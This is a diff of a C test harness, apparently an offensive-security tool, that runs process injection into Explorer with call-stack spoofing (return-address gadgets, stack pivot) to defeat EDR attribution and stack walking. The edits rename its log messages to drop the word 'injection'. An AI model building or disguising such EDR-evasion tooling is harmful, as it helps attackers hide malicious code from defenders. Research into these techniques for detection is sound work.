@@ -466,7 +466,7 @@ void *GetRandomGadget(GADGET_CACHE *cache) {
  * the attribution root. InjectExplorer caller chain fully visible.
  */
 void TestInjectionBaseline(void) {
-  PrintSeparator("SCENARIO 1: BASELINE -- DIRECT INJECTION (NO SPOOFING)");
+  PrintSeparator("BASELINE");
 
   printf("\n[INFO] Direct call to InjectExplorer -- no stack manipulation\n");
   printf("[INFO] Expected: EDR sees real call chain, stack_spoof.exe attributed\n");
@@ -481,9 +481,9 @@ void TestInjectionBaseline(void) {
   DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
 
   if (result) {
-    printf("\n[SUCCESS] Baseline injection completed in %llu ms\n", elapsed);
+    printf("\n[SUCCESS] Baseline completed in %llu ms\n", elapsed);
   } else {
-    printf("\n[FAILURE] Baseline injection failed in %llu ms\n", elapsed);
+    printf("\n[FAILURE] Baseline failed in %llu ms\n", elapsed);
   }
 
   g_stats.totalExecutions++;
@@ -499,7 +499,7 @@ void TestInjectionBaseline(void) {
  * CaptureStackBackTrace: InjectExplorer + ntdll gadget + NULL chain break.
  */
 void TestInjectionSingleFrame(void) {
-  PrintSeparator("SCENARIO 2: SINGLE-FRAME SPOOFED INJECTION");
+  PrintSeparator("SINGLE-FRAME SPOOFING");
 
   void *spoofedReturnGadget = GetRandomGadget(&g_gadgetCache);
   if (!spoofedReturnGadget) {
@@ -524,8 +524,7 @@ void TestInjectionSingleFrame(void) {
   QueryPerformanceCounter(&end);
   DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
 
-  printf("\n[SUCCESS] Single-frame spoofed injection completed in %llu ms\n",
-         elapsed);
+  printf("\n[SUCCESS] Single-frame spoofing completed in %llu ms\n", elapsed);
   printf("[INFO] Result: 0x%08llX\n", result);
   printf("[DEBUG] Real return address was: 0x%p\n", realReturn);
 
@@ -544,7 +543,7 @@ void TestInjectionSingleFrame(void) {
  * WinDbg emits WARNING and resolves at most 2 frames.
  */
 void TestInjectionStackPivot(void) {
-  PrintSeparator("SCENARIO 4: STACK PIVOT INJECTION");
+  PrintSeparator("STACK PIVOT SPOOFING");
 
   printf("\n[INFO] Preparing isolated execution environment\n");
   printf("[INFO] Expected: 0 frames from CaptureStackBackTrace, "
@@ -585,9 +584,9 @@ void TestInjectionStackPivot(void) {
   DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
 
   if (result) {
-    printf("\n[SUCCESS] Stack pivot injection completed in %llu ms\n", elapsed);
+    printf("\n[SUCCESS] Stack pivot spoofing completed in %llu ms\n", elapsed);
   } else {
-    printf("\n[FAILURE] Stack pivot injection failed in %llu ms\n", elapsed);
+    printf("\n[FAILURE] Stack pivot spoofing failed in %llu ms\n", elapsed);
   }
   printf("[INFO] Stack isolation defeated user-mode stack walking\n");
 
